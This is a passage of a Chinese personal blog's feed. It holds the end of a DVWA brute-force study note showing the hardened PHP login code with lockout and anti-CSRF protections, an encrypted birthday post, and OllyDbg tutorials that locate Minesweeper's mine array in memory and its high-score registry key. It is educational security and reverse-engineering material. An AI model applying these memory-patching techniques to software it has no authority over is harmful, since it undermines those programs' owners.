. date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;源码使用Anti-CSRF token防止CSRF攻击，同时采用PDO（PHP Data Object）机制防御sql注入。<br>&emsp;&emsp;在数据库中针对每一个用户名添加了failed_login, last_login字段，记录用户错误登录次数和上一次登录时间，当错误次数大于3次时，锁定账户15分钟。当正确的用户登录时，提示该用户可能被爆破攻击，并显示错误次数和上次登录时间。</p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/10.png" width="500" height="301"></div><p><br></p><div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/11.png" width="300" height="297"></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文介绍了dvwa中Brute Force四个安全级别的源码和攻击方式。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="DVWA" scheme="https://yiwenzhe.com/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>20岁</title>
    <link href="https://yiwenzhe.com/2021/05/24/20%E5%B2%81/"/>
    <id>https://yiwenzhe.com/2021/05/24/20%E5%B2%81/</id>
    <published>2021-05-23T16:00:00.000Z</published>
    <updated>2022-10-20T03:35:20.483Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="136439a5efe93d6a0901be50fb24b06eeefffd6b8477995147cf6b848f271df5">5fe6c8a68ad5071aecbb46d073c33745fd8d5119223478584053223fb82f9bebc67f29404dc2d3b2769d23a02ee6c6ee3fdb7c423d3007f4f5313f836b8ac9a3996c1d1f68e82ff7c39c272d6436f348002d73302680d1e462eeacfad0b49c022adae06c86cc5e28f66961bb2cce9fb8a146496518b281bec79d977f78a3db065f5ae071989e085436f757acec368e918830c1a094dc62b660a45889c5effd25670cf1d7a3de9a6e81a337ababc277a19c24e681b2eecb29261c5045a4c8385591badc8f57d8ef3b2181ed1d6f5e345fc937e7c33ab683b1fe6f2cedf5e53a22da9073c5a82c08359bee9205d8aa73ec4c685190fa462830cfbd336de2efcf70630bf4951a27fdd4ed86a6f2e946799f00d6c0f4c82678db0bd68c36e3d5ae0c2958cf3b9e6b3019c916f176fb1f3be547fb773ab760d1e5a314aaa3357bca39f4ba2d3173768fae547c9af53d57eee74cda7581fce214508904b911bf38a89dd42a36ba5fe6e0ea184e168b6952f39c920c0eb0ce114fddb3b2f919330cb4c9510d1990f1f52bf6f41f506437e419b9f21f65411c0eae7e2ee3dc5c10cc32818f66dfefa70570a1ed815dc2e4068c59fda332f06ccd3a367b72b298b6d2c72e8b4fa224e26b8998da33578c18aa2e2de0bea7c5b8afb6b7405a0593dcc646643f4684f9d2094531777da1a3e6e94fa8a5f5882b2e2e2f510d73ef571822a4c02fd08a967039923628c2463c8976746de0634b387ecfea788b3ea9d5e2d2a8aa7bf07bf8ffec90ec8523a0908d52dba7736b1148c43809f0e09c7a8a7dfabb6d6593c75fd5d70642f50f04d7e99c8b44f775f4bf35b3ab15fbaaed34a96b5e7b043247685cd67a6502b7a86a4f273ae8e90146d954250a8d23aa83918bad6ca27822c58bc994aab2371847b3670b492c40d89efc3f63385debb6d94accad1cc29119d6e7cba4f18eda3463641925827156ec734e6d1753dc0561f381652293a09a9f2129e69a46d9b7c669788cd3b2b3748d96985ce03fc0b8ead638ef741f691da419920d86cee360847936998ed1184e6d384b7aebec347b1bf7081fd9b4c16a4f2ad60ee9521f1c947071a91c73b808bdc9141bff610b68a123f4a0991e33adc022bda8bf9d0d46109c582ebcae64882d80dcef06d94d4990b2199a5526562b8ba3c6bb6675490bb84bff7b86f4d831eb80963dea3d1bb98e679a8352d110010cac0a02f1c82a649318e05dee5d57a3f4c942b96a76de398f447831611a6254f69a6ba7400b64a6e5f8fde0b5ec811cf05457fc90f50496183261dc72ba3c51fa3c03887f1adcb10b245ce19fcba9f2766a818bfa52f5527d75c210281fb88bc1abcf576192aea7ae89a5cc3bced7bdfa8f5003d18fd60f31f86aa6f7365532fe0bad4564f8cb5d852d6d5d310c2d0abb43623a1ee8597def1dd16dae056662c6c2fd08b0bde65d32be5141b826a35ceb03d72e912435abdc12c6e31220753a088761f85fa56da3a56b3ec912c3b52ed8c61edffd717b9add7e7dc9794ef3e144912dbda42fb2544990effa650599e2c4bc615e679af4c8df99065e377f82a30f08c40acbde77a4313f87eb084cc76260251578e3ab8c50c366083a4ae067d257f68e663d5bbd42c35bf2e2f0b8aa9ad016c9c92a4b14b6430fbdbf56e50a11e52945bab19cc13dabff77becdbc02a4c747b485951a71d2bcee4fbab1a901c1a86aa3d9fe995d76a48247afeec53c2c2bf27290f0f5292e047231f7498e9bd617f5f8a81402c7011dc0cae1700e5ce864b1c49de2a4af6ef89078321c052f9beb891f28223b9048df9c6cbe0923ca1f13f93df60a6d64cc233b2d51793f145e087e46f8c0ab09ab5e67e059f7917609b8c9881674c72f5bb50b1bba9e1a2df879101dbb7d44af5e56db416fb5b82c7c4768022ca4ba11682acb2ead5dc2eb4fc99c52641b35882020099a7369ce2ea0598f568d5c384be103f66c8f74a142cf09b9ee104567df3c18142b9327314ea8e3456a7728bf3ee7941cb0e318326fca68519440a7b02b867606acc6c4812c8faaf38d24bb254c46eb543fc6a69c5cfbc8f5e45a04bbfd942cedb24784372341a757d098249f7622d5bdebd2d03f52eb84078b6862f12dee30ba15b0410dcb854c395ac3dcc5657c2c0c9c6dabee135af8bdb967d903eaeb13a678b1259b2c6f75a3173eb0f7539b81331252b205d6faec5694d25a9f03a832fd19b8d4488ae106f1a6f2a1e95148fc7f0adb4165665cbb525d68c0357aaa9676294912811b3f93ab3b6cd7a9d25ca88520e5578b8fb9b8c1ca969b9d666306a498e20214a202a7c76d9c9b7f97521242f1e6c562b8297779755c476f14a9867df78419ab122b1d9476818efbb3526621cd6624c0fd84cd70fceefc541664cf02280a1210fde6d60fc9dc2df3762cab343e1e471bd26734bfa9521dd59ed94c31e90d0ec37f2cd659c48fd83825b1635da909bd27b82014bbcb4b7aca0ed9ba2c51b5650609427e052e768e3692f1964360e2aff0731489debfb82425a45e1e3fce803117ee9aaa4169f883dceca4259cf7f1bbbf4335a60cce5c72b567e70dc1e1d584ff3638cbfd9a93d6874061514a0268a0bb7f51220de4f2a585dd46b71242df7ced07775b3fdf46a8143f0d5a875108476919de0a51eea921a36924577ffe26b2cb85756b0de28d4dfda6169569d7859448e1fb3525907a1efac064c97bbf155b7a810c3d6025fcb75544ec73b2f83e6fba5d85c2775f193b1e80fa31674cbad3d62b17094aa32447d445bddab7e9b776c89c7835d74971ca57ec730b14e71f4d7f0dc105a78102ac64a1af02354fa638b164922f92bee6928c353089d47b1f88a45d408a3d7291777710218b5e2712f504388d1e42e2602cdc25550c19147a0218d318ae97fe575ef85b1d07c272d492fb16fc9b79423efcdb2990e6e1c5f9772a06918c95145d428213b7c6ad81238eb53bf9fcce727beb26aab88cac1a6f0a4e3a976979c308ebbc951b6f18a62718085e59b9c899f64f0d6e227b3a55f83cf3799c709db2e4a5bbd4eb1811c81fd6822eeb91172aac8fda178b9404f44ee781956dec00d28a9158d9bc1f0e8a9a78f38321735452902dd7ce52333b930b7a8f9b3394bffb008689e2903e3f64d73df301e41008418f811af72025abeb9bcc9c0a09078ae8236998d9aec9c6ffb604044e06ee47e1309ca6be9de24eaee773337a79193a6ac074de5fed471740aa3db04585a488db153d5aad0bc05b860399cd86c1a5511896afb32fad5ba958ac2efd9fd6cb9f6020abde702e18991d1cd5a5574a9149d41f3fce5018a355b119ce4bed5cd9f7fda0f95bb11d566788e1c19cb8a9aed4a655dde6232f614511e79135755e6cff73d09b6cc3bcc60712be260bd473392458a59e49d2d3e50e0f47213361d265a99cb5731b2eacac7c56017db44f434b4dc9a64770342fe214b00d91ddc50e99d22d771901c3f05bde61aa3a670647b7b07c3dd6641809afedd7b38200547b654ba93f575f1186df0644d47da509db3510ec53d9735f6352e67f916e01e202943e5a9a9bd3ddc6b62b78b0b4d11c5c15da7bde391c033b98d047b2a16ad5cc80fef6e406ec9b840f4eca60be20c6c05e6fbced30eece42aebe5fa5538f8e01357f0413c27ececdcec36be7f658ac3e185f1113294afabbcafff2fe1cfdd282a9695c584afdbded829133dd309b9c0292052121222f287bcb9a1b59b58dde5682131749a737055f4a19e59947906cec534abed56c3039509c08a9b8a9e208272e3f40362d4ba915b83bd8dba0ba01d15586eb88d080cfff8cb3d4d914485e2ffa2def89c81a866c4d7d5d0200517e59c51c632b6b5d7f9a6e92e7d674aacde21034caca6207ec13800a7e09b5e7b490c4676646be33c0d8a1f8679007c8af4b1b68986c51d0794e07ed33655b1923740e5f96028b8328bf37d77d2c6459b262d881764f71e65cfda7270d29f1d92fceba1da5bb846b08da29d16869d4f37376dab1a7232abc4160a832402fe67a8c489275aafa2cc84edcf85765a7b9b5cb364d48858f4789e61dcb97942fb4b0a41db154e7a9c85e73d822f0b0f0693df57a7d154d3012a6f12cb8f9a4c1b1bfe248a5d3fd372b2571857fe96c41b379d1622b9f3a2514218c5e543f4bbe6a4cd748c256d39ee72ad314d6c772d4003809419eb880315a4e544c1faed96caf71d4f8a274c2b52edeedcac6825810e04fa947ec8249093b031137326e9fadff2c5afc267f32fc5791a8ae3b205b5988b8f3ac9b9cb968efae3eea517ddb80453f0bf3e35e547181867bf9553813aacbb2a11ea8a716abd64ed8f4de69c32c528b290faedad553a92da17b60d33d6abfb594b1ae421365bd68455898b12e6744246897b8fec8b7cead708a4e429b2dd5a226667d29860b3ef83c4b7cc497f92e4f07837e59dac41fd5b8fb98dc082b628e572cc4a5f8faa32a06a78b4dbaa95d32f6e34f67751e41cdbc05b57ed21b73447c7210506925c218c777d47e89058aea67c757f5f574927a8e874b76f3e75571cf1f8f413b10c814e49f35f4269412d3cdb4567a4682a2d3b16d2379e49da15b13780578e1490e0ac95184f049d79502804ab0d5b8eb96cb14553e385afc8c2bcdc8e1c29fe160498497c837d913da9f9629cfe2bb866d21e88eab2ab15bdf918893a0cd6d45534ae75156d79b651c91b5ea377e4a656510cc01eb409e68f57978a51b10f56cf46d354b2bba7fe070f31ac9728120bd6ca21450181d120e117b0dbdefaccb73ee4f2b6209e82f4933e33409371db97d409345b35cab5a8b7ec47b3ae38db6ff896cabd526d8e1f528537254fd7a6c3a288b4dd44b2ed1d24b038c394ed11c6e58bb0ac99ff472cd582125ddda812d4a8affa6953aadcf06800f1cc2642c75e2779c11e4b81c1e261bf98ff57499d02a64a03b756df3dac498d5fe87176a0e0d15964ed7555e5d23cec9ddaba9e99cb9d5bc4bc872dbc90c30475122018cdb0b70d358773e579e7a7cb0c3b1ba3162f83cae8fcefd1c96cd1f9ffcb4a3ad31caa8a574e495bbb02b0ed7a66abd52d3ce8a7f78ba5fb56d0854903a393860268e763bc22a9f3225d655e7445b94735ba2046bafc98f26d4d703edef571e907305c4b26c03073d308964b31519cd5aa7e6edf6d90735685888a667157d1b2c8b8f45a4ea0a125acf28e44db645ee22b8980e655571398bfd307f2e074160011ea4eae49cabf15dd8be2bf0441a87da33aeb968029e0e54300adb4017a7c8ef51a6d9b1b726e9df6ba21a6209c7b637a91a974c15f382e86164a2cfebfc22208295b6ace727f38e827a09f3a5c80da2f328b31863cf5e1c25c4f291ec9bb09cd520da0cf4e2eac0b807d6b7bc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码为我的出生年份</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">人生第二个十年</summary>
    
    
    
    <category term="人生十年" scheme="https://yiwenzhe.com/categories/%E4%BA%BA%E7%94%9F%E5%8D%81%E5%B9%B4/"/>
    
    
    <category term="生日" scheme="https://yiwenzhe.com/tags/%E7%94%9F%E6%97%A5/"/>
    
  </entry>
  
  <entry>
    <title>软件逆向之扫雷(二)：破解雷区</title>
    <link href="https://yiwenzhe.com/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/"/>
    <id>https://yiwenzhe.com/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/</id>
    <published>2021-03-04T07:35:25.000Z</published>
    <updated>2022-10-20T05:56:01.463Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="问题导入"><a href="#问题导入" class="headerlink" title="问题导入"></a>问题导入</h1><p>&emsp;&emsp;上一节中我们通过修改注册表修改了扫雷英雄榜，自行改动了榜上的昵称和时间。然而这只是表面工作，没有解决扫雷游戏的本质：找出所有雷区。这一节我们分析雷区的存储方式和位置，人工破解雷区。</p><h1 id="雷区分析"><a href="#雷区分析" class="headerlink" title="雷区分析"></a>雷区分析</h1><p>&emsp;&emsp;扫雷的界面是一个n*m的矩形雷区，每个小方块代表一个位置，和矩阵十分类似。因此我们猜想是通过二维矩阵来存储数据，将矩阵中特定位置标记为雷区，而每次点击非雷区时会出现数字，即计算点击位置周边八个块的地雷数目，然后显示在块上。<br>&emsp;&emsp;将矩阵转化成扫雷的界面则需要调用几个API函数，比较常用的就是BitBlt函数。BitBlt将某一内存块的数据传送到另一内存块，前一内存块被称为”源”，后一内存块被称为”目标”。使用该函数我们可以将矩阵进行变换，从而显示出来。</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>&emsp;&emsp;使用OllyDBG打开扫雷程序winmine.exe，查看调用的API函数。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/1.png" width="400" height="325"></div><p>&emsp;&emsp;可以看到从GDI32.dll导入的函数很多与作图有关，如SetLayout、CreatePen等。我们选中BitBlt函数，在每个参考上设置断点，然后运行至断点处。<br>&emsp;&emsp;第一个断点处，整个扫雷界面都未加载完成，而且我们也没有进行点击，故不是所需代码块，取消该出断点，继续运行。<br>&emsp;&emsp;图像界面显示出来，程序停止了运行，表示程序还未运行到第二个断点，可能在等待用户点击鼠标。我们选择雷区任意一个位置点击，程序运行到第二个断点处停止。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/2.png"></div>&emsp;&emsp;BitBlt所需参数均在图中标识出来，现在我们需要分析这些参数，找到二维矩阵的内存位置。&emsp;&emsp;首先我们要知道矩阵位置的计算，对于一维矩阵，a[n]，a[i]的内存位置=基址(a[0])+i\*sizeof(单个数据内存大小)。对于二维矩阵a[m][n]，a[i][j]的内存位置=基址+i\*n\*sizeof(单个数据内存大小)+j\*sizeof(单个数据内存大小)。<div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/3.png" width="300" height="110"></div><p>&emsp;&emsp;函数中刚好有两条类似的寻址语句。[edx+eax+01005340h]和[edx*4+105A20]。第一条是mov操作，并且更符合二维数组寻址，因此我们猜测01005340h是数组基址。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/4.png" width="600" height="203"></div><p>&emsp;&emsp;在左下角数据窗口使用ctrl+G，输入01005340h，跳转到该位置。查看数据窗口内容。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/5.png" width="500" height="217"></div><p>&emsp;&emsp;数据窗口一开始全是10，有33个。由于我们使用的是高级模式，扫雷界面是16*32，初步猜测10代表边界。然后是大量0F和少量8F。前七个数据是六个0F和一个8F，那我们点击扫雷第一排前七个格子。前七个均没有雷，第八个是雷。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/6.png" width="300" height="221"></div><p>&emsp;&emsp;查看数据区内容是否发生变化：</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/7.png" width="500" height="111"></div><p>&emsp;&emsp;前五个格子为空，数据由0F变为40；第六个格子是数字1，数据由0F变为41。同时数字2、3对应数据也分别变为42、43。得出结论：未点开非雷区数据为0F，点开的非雷区数字x的数据为4x。<br>&emsp;&emsp;第七个格子是我们点中的雷，数据由8F变为CC；而第八个格子我们未点中的雷由8F变为8A。得出结论：原数据8F即表示该位置是雷。<br>&emsp;&emsp;除此之外，扫雷还有两个符号，旗子和问号，现在我们再次尝试，分别在雷区和非雷区标上旗子和问号，查看数据。</p><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/8.png" width="300" height="219"></div><br><div align="center"><img src="/2021/03/04/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%BA%8C-%EF%BC%9A%E7%A0%B4%E8%A7%A3%E9%9B%B7%E5%8C%BA/9.png" width="500" height="82"></div><p>&emsp;&emsp;标上旗子，雷区数据由8F变成8E，非雷区数据由0F变成0E；标上问号，雷区数据由8F变成8D，非雷区数据由0F变成0D。由此可得雷区最高位为1，不论是8（1000）还是C（1010），最高位都是1；非雷区最高位为0。<br>&emsp;&emsp;由以上情况作出总结：<br>雷区（最高位为1）：<br>&emsp;&emsp;1.未点开为8F<br>&emsp;&emsp;2.点开为CC，其他为8A<br>&emsp;&emsp;3.标上旗子为8E<br>&emsp;&emsp;4.标上问号为8D<br>非雷区（最高位为0）：<br>&emsp;&emsp;1.未点开为0F<br>&emsp;&emsp;2.点开为4x（x代表格子显示数字）<br>&emsp;&emsp;3.标上旗子为0E<br>&emsp;&emsp;4.标上问号为0D<br>当然我们也可以人为修改数据达到各种效果，如初始化是雷区却不爆雷等。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;分析扫雷的雷区存储位置和设计方法，人工破解雷区。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="软件逆向" scheme="https://yiwenzhe.com/tags/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>软件逆向之扫雷(一)：修改扫雷成绩</title>
    <link href="https://yiwenzhe.com/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/"/>
    <id>https://yiwenzhe.com/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/</id>
    <published>2021-03-03T14:56:47.000Z</published>
    <updated>2022-10-20T05:56:44.412Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="问题导入"><a href="#问题导入" class="headerlink" title="问题导入"></a>问题导入</h1><p>&emsp;&emsp;扫雷的游戏目标是在最短的时间内根据点击格子出现的数字找出所有非雷格子，同时避免踩雷，踩到一个雷即全盘皆输。如果用时破纪录，则会在扫雷英雄榜上留下昵称和用时记录。现在我们通过逆向分析来人为修改这一记录。</p><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>&emsp;&emsp;Ollydbg：通常称作OD，是反汇编工作的常用工具。本人使用的是看雪学院的优化版OD：OllyICE，可在看雪学院官网进行下载。</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>&emsp;&emsp;下图为游戏菜单栏，可以看出扫雷英雄榜的点击链接在“菜单栏”-“游戏”-“扫雷英雄榜”，菜单项会响应鼠标点击并显示出英雄榜信息。</p><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/1.png" width="200" height="265"></div><br><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/2.png" width="200" height="110"></div><p>&emsp;&emsp;可以看到英雄榜初始化昵称均为匿名，时间均为999。当扫雷在不同电脑运行时，该英雄榜均会初始化，因此该数据应该不是存储在exe中，可能是电脑某个文件，如软件注册表。<br>&lt;/br&gt;<br>&emsp;&emsp;用Ollydbg打开winmine.exe，得到如下调试界面：</p><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/3.png"></div>&emsp;&emsp;现在我们需要找到注册表位置，也就是找到注册表相关函数，这些函数都是exe从外部dll库调入的。在反汇编窗口点击右键，选择“查找”-“当前模块中的名称（标签）”，得到exe的导入库函数。<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/4.png"></div>&emsp;&emsp;点击地址字段排序，最前面几个函数均是从ADVAPI32.dll导入的，和注册表有关。<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/5.png" width="400" height="108"></div><p>&emsp;&emsp;RegCreateKeyExw函数功能为创建或打开注册表项。默认为创建，当注册表中有此项时，为打开。我们左键选中该函数，右键选择在“每个参考上设置断点”，这样调用该函数位置均会加上断点。</p><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/6.png"></div>&emsp;&emsp;返回反汇编窗口，快捷键F9（fn+F9）运行程序到断点位置。右下角堆栈窗口即有函数调用的参数信息，可以看到注册表位置路径“Software\Microsoft\winmine”。<div align="center"><img 